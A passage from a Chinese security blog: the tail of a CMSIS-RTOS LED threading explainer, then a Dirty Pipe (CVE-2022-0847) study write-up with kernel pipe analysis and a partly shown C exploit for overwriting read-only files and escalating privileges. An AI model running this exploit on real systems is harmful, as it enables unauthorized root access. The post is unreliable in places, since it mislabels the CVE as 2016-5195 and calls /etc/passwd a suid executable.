current,</span></span><br><span class="line"><span class="comment"> * end user licence from KEIL for a compatible version of KEIL software</span></span><br><span class="line"><span class="comment"> * development tools. Nothing else gives you the right to use this software.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This software is supplied &quot;AS IS&quot; without warranties of any kind.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2017-2021 Keil - An ARM Company. All rights reserved.</span></span><br><span class="line"><span class="comment"> *----------------------------------------------------------------------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;main.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Board_LED.h&quot;</span>                  <span class="comment">/* ::Board Support:LED */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Board_Buttons.h&quot;</span>              <span class="comment">/* ::Board Support:Buttons */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;RTE_Components.h&quot;</span>             <span class="comment">/* Component selection */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Main stack size must be multiple of 8 Bytes</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> APP_MAIN_STK_SZ (512U)</span></span><br><span class="line"><span class="type">uint64_t</span> app_main_stk[APP_MAIN_STK_SZ / <span class="number">8</span>];</span><br><span class="line"><span class="type">const</span> osThreadAttr_t app_main_attr = &#123;</span><br><span class="line">  .stack_mem  = &amp;app_main_stk[<span class="number">0</span>],</span><br><span class="line">  .stack_size = <span class="keyword">sizeof</span>(app_main_stk)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">volatile</span> <span class="type">uint32_t</span> delay_val = <span class="number">500U</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> osThreadId_t tid_thrLED;         <span class="comment">/* Thread id of thread: LED */</span></span><br><span class="line"><span class="type">static</span> osThreadId_t tid_thrBUT;         <span class="comment">/* Thread id of thread: BUT */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">  thrLED: blink LED</span></span><br><span class="line"><span class="comment"> *----------------------------------------------------------------------------*/</span></span><br><span class="line">__NO_RETURN <span class="type">static</span> <span class="type">void</span> <span class="title function_">thrLED</span><span class="params">(<span class="type">void</span> *argument)</span> &#123;</span><br><span class="line">  <span class="type">uint32_t</span> led_max    = LED_GetCount();</span><br><span class="line">  <span class="type">uint32_t</span> led_num    = <span class="number">0U</span>;</span><br><span class="line"></span><br><span class="line">  (<span class="type">void</span>)argument;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    osThreadFlagsWait(<span class="number">0x0001</span>U, osFlagsWaitAny ,osWaitForever);</span><br><span class="line">    LED_On(led_num);                                            <span class="comment">/* Turn specified LED on */</span></span><br><span class="line">    osThreadFlagsWait(<span class="number">0x0001</span>U, osFlagsWaitAny ,osWaitForever);</span><br><span class="line">    LED_Off(led_num);                                           <span class="comment">/* Turn specified LED off */</span></span><br><span class="line"></span><br><span class="line">    led_num++;                                                  <span class="comment">/* Change LED number */</span></span><br><span class="line">    <span class="keyword">if</span> (led_num &gt;= led_max) &#123;</span><br><span class="line">      led_num = <span class="number">0U</span>;                                             <span class="comment">/* Restart with first LED */</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">  thrBUT: check button state</span></span><br><span class="line"><span class="comment"> *----------------------------------------------------------------------------*/</span></span><br><span class="line">__NO_RETURN <span class="type">static</span> <span class="type">void</span> <span class="title function_">thrBUT</span><span class="params">(<span class="type">void</span> *argument)</span> &#123;</span><br><span class="line">  <span class="type">uint32_t</span> button_msk = (<span class="number">1U</span> &lt;&lt; Buttons_GetCount()) - <span class="number">1U</span>;</span><br><span class="line"></span><br><span class="line">  (<span class="type">void</span>)argument;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    osDelay(delay_val);                                 <span class="comment">/* Wait */</span></span><br><span class="line">    <span class="keyword">while</span> (Buttons_GetState() &amp; (button_msk));          <span class="comment">/* Wait while holding USER button */</span></span><br><span class="line">    osThreadFlagsSet(tid_thrLED, <span class="number">0x0001</span>U);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"> * Application main thread</span></span><br><span class="line"><span class="comment"> *---------------------------------------------------------------------------*/</span></span><br><span class="line">__NO_RETURN <span class="type">void</span> <span class="title function_">app_main</span> <span class="params">(<span class="type">void</span> *argument)</span> &#123;</span><br><span class="line"></span><br><span class="line">  (<span class="type">void</span>)argument;</span><br><span class="line"></span><br><span class="line">  LED_Initialize();                                     <span class="comment">/* initalize LEDs */</span></span><br><span class="line">  Buttons_Initialize();                                 <span class="comment">/* initalize Buttons */</span></span><br><span class="line"></span><br><span class="line">  tid_thrBUT = osThreadNew (thrBUT, <span class="literal">NULL</span>, <span class="literal">NULL</span>);        <span class="comment">/* create BUT thread */</span></span><br><span class="line">  <span class="keyword">if</span> (tid_thrBUT == <span class="literal">NULL</span>) &#123; <span class="comment">/* add error handling */</span> &#125;</span><br><span class="line"></span><br><span class="line">  tid_thrLED = osThreadNew (thrLED, <span class="literal">NULL</span>, <span class="literal">NULL</span>);        <span class="comment">/* create LED thread */</span></span><br><span class="line">  <span class="keyword">if</span> (tid_thrLED == <span class="literal">NULL</span>) &#123; <span class="comment">/* add error handling */</span> &#125;</span><br><span class="line"></span><br><span class="line">  osThreadExit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先看到<code>app_main_attr</code>，这里定义了栈空间以及大小，使用了一个512字节的预分配空间。</p>
<p>然后是<code>app_main</code>函数，这是线程的入口点。其中首先对LED灯和按钮进行初始化，随后创建了两个子线程，分别执行<code>thrBUT</code>函数和<code>thrLED</code>函数，这两个函数没有指定栈空间，前者控制按钮，后者控制LED灯。</p>
<p>在<code>thrBUT</code>中有死循环，首先延时500ms，然后循环判断<code>Buttons_GetState() &amp; button_msk</code>的值，为0时退出循环并设置<code>tid_thrLED</code>的标志位为1，其中<code>tid_thrLED</code>为LED线程的线程标志。<code>Buttons_GetState</code>函数会返回一个int值，每一位都代表一个按钮的按下状态。在上面的开发板中只有一个用户按钮（Reset不算），因此该函数的返回值只能为0或1。button_msk的值为1，根据逻辑可以推断出：当按钮按下时，<code>Buttons_GetState</code>的返回值为1，否则为0。当用户没有操作时，内部的while循环总是不循环，即每过0.5s就将LED线程的标志位设置为1。</p>
<p>在<code>thrLED</code>中也存在一个死循环，首先调用<code>osThreadFlagsWait</code>，当该线程的标志位中有0x1，选项是<code>osFlagsWaitAny</code>，即永远（osWaitForever）等待标志位的最低位被设置为1，当检测到标志位被置位时，立即退出并将标志位复位为0。等待结束后打开LED灯，随后继续等待，等待后关闭LED灯，更换目标LED灯，继续循环。</p>
<p>整个过程非常清晰，延时的时间长度由<code>thrBUT</code>函数决定，当用户按下按钮时，相当于<code>thrBUT</code>函数阻塞在了内部的<code>while</code>循环中，暂时无法进行下一次置位。两个线程是一个“生产者与消费者”的关系，“消费”的对象就是LED线程的标志位。</p>
<p>通过上面的示例，我们对CMSIS-RTOS中不同线程之间的交互有了一定的了解。不同线程之间的交互可以通过标志位完成，以控制不同线程之间的逻辑时序。当然很显然仅通过这种方式进行交互还不够，如果需要数据传输则需要另外的方式。</p>
<h2 id="逆向分析"><a class="markdownIt-Anchor" href="#逆向分析"></a> 逆向分析</h2>
<p>除了分析C代码之外，简单分析下汇编代码也是有必要的。在Github中可以搜索到一个SVD-loader项目，它是一个Ghidra插件，能够在输入svd文件后自动分析文件中的外设定义，并将外设与对应内存建立联系，大大提高汇编代码及反汇编C代码的可读性。</p>
<p>每一个市面的MCU都可以找到其对应的svd文件，其中记录有所有外设的信息。最为重要的是所有外设映射的内存地址空间。在程序中，我们只能通过内存和寄存器来进行数据的存取，而无法直接与外设交互。即使是最底层的库，也不能脱离内存玩外设。为了解决这个问题，需要对MCU进行额外的设计，将外设与固定的内存地址建立映射关系。当代码访问到外设映射的内存地址时，MCU可以通过硬件找到外设对应的接口并完成相应操作。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2024/03/03/CVE-2022-0847%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/03/03/CVE-2022-0847%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">CVE-2022-0847复现记录</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-03-03 20:45:19" itemprop="dateCreated datePublished" datetime="2024-03-03T20:45:19+08:00">2024-03-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-03-16 20:38:06" itemprop="dateModified" datetime="2024-03-16T20:38:06+08:00">2024-03-16</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/kernel-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">kernel pwn 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>6.4k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>6 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Dirty Pipe漏洞较Dirty COW发现的时间较晚，但也正因为此，它影响了更多的Linux发行版。既然同是带Dirty的漏洞，这个漏洞就同样是与条件竞争有关。</p>
<p>漏洞：CVE-2016-5195</p>
<p>影响Linux版本：&gt;5.8, &lt;5.16.11 / 5.15.25 / 5.10.102</p>
<p>漏洞类型：竞争条件</p>
<p>使用Linux样本：5.16.10</p>
<p>编译环境：Ubuntu 20.04</p>
<p>参考资料：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/58489873">Linux管道基础知识</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11016?time__1311=mqmx0DyDuGYGuD0vo4%2BxOKD8DcAx9GCnYD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-0">CVE-2022-0847漏洞分析</a></li>
</ul>
<h1 id="前置知识"><a class="markdownIt-Anchor" href="#前置知识"></a> 前置知识</h1>
<h2 id="linux管道基础"><a class="markdownIt-Anchor" href="#linux管道基础"></a> Linux管道基础</h2>
<p>Linux管道是Linux进程间通信的一种方式。它的表现形式比较容易理解。试想一下，将我们带入到Linux开发者的身份中来，如果我们需要设计进程之间通信的方式，最容易想到的是什么？是的，我们可以将管道以文件的形式进行设计：</p>
<ul>
<li>创建管道可以通过创建文件来完成，这个文件与一般的文件不同，可以设置读写权限。</li>
<li>若进程A与B之间需要进行通信，假设只有A发送数据给B，即单方向通信，那么通信步骤可以这样设计：
<ul>
<li>进程A需要传输数据时，向管道文件写入数据，此时文件中保存的是进程A的数据。</li>
<li>进程B需要接受数据时，向管道文件读取数据，读取完成的数据在管道文件中自动删除，保证文件中只剩下未被读取的数据。</li>
</ul>
</li>
</ul>
<p>从上面的示例来看，这是一种典型的“生产者-消费者”模式，相信大家在学习线程的基础知识时已经了解过。当然为了实际使用的便捷考虑，最终的设计比上面的示例要复杂许多。</p>
<p>在Linux中有两类管道，一类是匿名管道，像shell命令中的’|'实际上就是创建了一个匿名管道，还有在程序内部父进程与子进程使用的一些管道为匿名管道。匿名管道由于没有命名，因此对外界是不可见的。另一类则是命名管道，这种管道有实际名字，可以在文件系统中被任何进程所访问，因此相较于匿名管道更为“开放”。</p>
<p>如果我们创建一个命名的管道文件，使用ls命令查看时，它的权限字符串以p开头，表示管道文件。打开这类文件产生的文件描述符不能被传入<code>lseek</code>中，因此可以想见管道文件的<code>file_operations</code>中<code>lseek</code>字段为<code>NULL</code>。</p>
<h2 id="linux管道内部机制"><a class="markdownIt-Anchor" href="#linux管道内部机制"></a> Linux管道内部机制</h2>
<p>上面我们了解了Linux管道的基础知识，下面我们需要深入到Linux内核了解它的实现机制。</p>
<p>既然管道是以文件的形式存在，那么在文件系统中就必然存在它对应的inode，只不过这个inode没有表示实际文件，是一个虚拟的inode。</p>
<p>在Linux内核中，表示inode的结构体为@<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.16.10/source/include/linux/pipe_fs_i.h#L58"><code>pipe_inode_info</code></a>，在结构体@<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.16.10/source/include/linux/fs.h#L620">inode</a>中有一个union字段，根据不同的文件类型有不同的结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>	*<span class="title">i_pipe</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span>		*<span class="title">i_cdev</span>;</span></span><br><span class="line">    <span class="type">char</span>			*i_link;</span><br><span class="line">    <span class="type">unsigned</span>		i_dir_seq;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>下面，我们通过<code>pipe</code>系统调用跟踪内核创建管道文件的过程。</p>
<p><code>pipe</code>系统调用和<code>pipe2</code>都可以用于创建管道，唯一的区别是参数不同，<code>pipe2</code>可以多指定一个<code>flags</code>参数，主要用于管道操作的一些细节。</p>
<p>既然<code>pipe</code>系统调用可以返回两个整数文件描述符，那么我们实际上可以将其看做文件。既然是文件，那么在拥有文件描述符后必然就会拥有<strong>对应的file_operations实例</strong>。对于管道文件。它的<code>file_operations</code>为<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.16.10/source/fs/pipe.c#L1214">@<code>pipefifo_fops</code></a>。其中定义了对管道的读操作应该调用<code>pipe_read</code>，写操作应该调用<code>pipe_write</code>。这两个函数与本漏洞密切相关，下面简单分析一下。</p>
<h3 id="pipe_read"><a class="markdownIt-Anchor" href="#pipe_read"></a> <code>pipe_read</code></h3>
<p>该函数传入两个参数，<code>struct kiocb*</code>以及<code>struct iov_iter*</code>，前者是kernel I/O control block的缩写，用于控制异步操作。后者为I/O vectors，可以用于封装多个I/O向量，能够处理多个缓冲区数据。</p>
<p>函数中的主要逻辑是一个大循环。这个循环的逻辑非常清晰，并且向我们展示了管道缓冲区的使用方式。Linux的管道缓冲区根据现实需求，应该被设计为一个队列。但Linux的设计却比一般的队列要优雅很多。首先，定义mask、start、end，标志缓冲区的总数，队列头部和队列尾部。根据代码逻辑可知，管道缓冲区的start始终不小于end，新的缓冲区从start处进入，从end处弹出。巧妙的是，Linux并不需要在队列头部到达最大缓冲区数量时将start重置为0，而是直接使用mask取模即可。另外，每一个缓冲区的长度不是固定的，定义了off和len，表示应该开始读取的位置以及剩余的数据长度。回到<code>pipe_read</code>中，每一次循环所做的实际上就是读取队尾的缓冲区并将其输出到read端，如果输出的字节数未达到read要求，则弹出最后的缓冲区进入下一次循环判断新的队尾。</p>
<h3 id="pipe_write"><a class="markdownIt-Anchor" href="#pipe_write"></a> <code>pipe_write</code></h3>
<p>写入的过程比读取要略微复杂一些。考虑到读取的效率问题，如果每一次写入都分配一个新的缓冲区，那么当单次写入数据较少时，整个队列缓冲区就会变得非常小，效率也会大大降低。因此当缓冲区不为空时，写入进程会尝试将数据合并到一个缓冲区内以避免缓冲区过小的问题。在Linux中，一个缓冲区以一页为单位。write进程会尽量填满缓冲区的一页内容。需要注意的是，可以合并的页必须有<code>PIPE_BUF_FLAG_CAN_MERGE</code>标志位才能够进行合并，这个标志位意味着该页可写且可合并。如果缓冲区没有设置该位，说明这个缓冲区还没有被初始化，需要首先分配一个物理页并设置该标志位。</p>
<h3 id="splice系统调用"><a class="markdownIt-Anchor" href="#splice系统调用"></a> splice系统调用</h3>
<p>这个系统调用能够将文件读取到管道中，可以指定文件偏移以及输出的偏移。在本漏洞中，起重要作用的是将文件内容读取到管道的流程。</p>
<p>这个系统调用的函数调用链较长，在<code>do_splice</code>中会判断数据流向的方向，随后文件-&gt;管道与管道-&gt;文件将走向不同的数据流。在<code>file_operations</code>中，内核专门定义了两个用于splice的函数指针：<code>splice_read</code>和<code>splice_write</code>，用于管道与文件的交互。对于一个普通文件，应该在<code>ext4_file_operations</code>中查找对应的函数，为<code>generic_file_splice_read</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sys_splice</span><br><span class="line">  __do_splice</span><br><span class="line">    do_splice</span><br><span class="line">      splice_file_to_pipe</span><br><span class="line">        do_splice_to</span><br><span class="line">          generic_file_splice_read</span><br><span class="line">            call_read_iter</span><br><span class="line">              ext4_file_read_iter</span><br><span class="line">                generic_file_read_iter</span><br><span class="line">                  filemap_read</span><br><span class="line">                    copy_pages_to_iter</span><br><span class="line">                      __copy_to_page_iter</span><br><span class="line">                        __copy_to_page_iter_pipe</span><br></pre></td></tr></table></figure>
<p>而在<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.16.10/source/lib/iov_iter.c#L384">@<code>__copy_to_page_iter_pipe</code></a>中，可以清晰看到，文件映射页被直接作为缓冲区使用。但在查看相关执行流程时，我们并没有看到文件映射页面被载入到缓冲区时重置<code>PIPE_BUF_FLAG_CAN_MERGE</code>标志位的情况，也就是说，如果管道缓冲区已经被完全读写过一次，就可以通过向管道写入数据的方式向文件映射页写入数据！</p>
<p>通过上面的分析，我们不难发现，Linux内核开发人员为了提高效率，选择在文件映射后直接将映射页作为缓冲区，但却并没有移除写权限。See？这看似是一种非常低级的开发安全问题，但却能实实在在地存在于Linux内核中并影响众多发行版。</p>
<p>通过该漏洞，我们可以修改只读文件。在普通用户权限下，可以通过修改/etc/passwd这种具有suid权限的可执行文件完成提权，如将/etc/passwd修改执行/bin/sh等。</p>
<p>但本漏洞利用有一定的限制，考虑到要将文件调入，因此至少需要读取文件的第1个字节，故文件的第1个字节不允许修改；不能通过该漏洞将文件变大；最多只能写入1页内容。在本文的主要参考资料中，/etc/passwd被修改为一个小型elf程序而不是shell文件，用于执行/bin/sh。</p>
<p><img src="1.png" alt="" /></p>
<h1 id="poc"><a class="markdownIt-Anchor" href="#poc"></a> poc</h1>
<p>poc来源：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11016?time__1311=mqmx0DyDuGYGuD0vo4%2BxOKD8DcAx9GCnYD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-10">资料</a>（在此%一下Arttnba师傅）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error : \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span>            page_size;</span><br><span class="line">    <span class="type">size_t</span>          offset_in_file;</span><br><span class="line">    <span class="type">size_t</span>          data_size;</span><br><span class="line">    <span class="type">int</span>             target_file_fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span>     <span class="title">target_file_stat</span>;</span></span><br><span class="line">    <span class="type">int</span>             pipe_fd[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>             pipe_size;</span><br><span class="line">    <span class="type">char</span>            *buffer;</span><br><span class="line">    <span class="type">int</span>             retval;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// checking before we start to exploit</span></span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Usage: ./exp target_file offset_in_file data&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    page_size = sysconf(_SC_PAGE_SIZE);</span><br><span class="line">    offset_in_file = strtoul(argv[<span class="number">2</span>], <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (offset_in_file % page_size == <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;Cannot write on the boundary of a page!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    target_file_fd = open(argv[<span class="number">1</span>], O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (target_file_fd &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;Failed to open the target file!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fstat(target_file_fd, &amp;target_file_stat))</span><br><span class="line">        errExit(<span class="string">&quot;Failed to get the info of the target file!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (offset_in_file &gt; target_file_stat.st_size)</span><br><span class="line">        errExit(<span class="string">&quot;Offset is not in the file!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    data_size = <span class="built_in">strlen</span>(argv[<span class="number">3</span>]);</span><br><span class="line">    <span class="keyword">if</span> ((offset_in_file + data_size) &gt; target_file_stat.st_size)</span><br><span class="line">        errExit(<span class="string">&quot;Cannot enlarge the file!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (((offset_in_file % page_size) + data_size) &gt; page_size)</span><br><span class="line">        errExit(<span class="string">&quot;Cannot write accross a page!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// exploit now...</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Start exploiting...\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * prepare the pipe, make every pipe_buffer a MERGE flag</span></span><br><span class="line"><span class="comment">     * Just write and read through</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Setting the PIPE_BUF_FLAG_CAN_MERGE for each buffer in pipe.\033[0m&quot;</span>);</span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    pipe_size = fcntl(pipe_fd[<span class="number">1</span>], F_GETPIPE_SZ);</span><br><span class="line">    buffer = (<span class="type">char</span>*) <span class="built_in">malloc</span>(page_size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> size_left = pipe_size; size_left &gt; <span class="number">0</span>; )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> per_write = size_left &gt; page_size ? page_size : size_left;</span><br><span class="line">        size_left -= write(pipe_fd[<span class="number">1</span>], buffer, per_write);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> size_left = pipe_size; size_left &gt; <span class="number">0</span>; )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> per_read = size_left &gt; page_size ? page_size : size_left;</span><br><span class="line">        size_left -= read(pipe_fd[<span class="number">0</span>], buffer, per_read);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Flag setting has been done.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Use the splice to make the pipe_buffer-&gt;page</span></span><br><span class="line"><span class="comment">     * become the page of the file mapped, by read</span></span><br><span class="line"><span class="comment">     * a byte from the file accross the splice</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Reading a byte from the file by splice.\033[0m&quot;</span>);</span><br><span class="line">    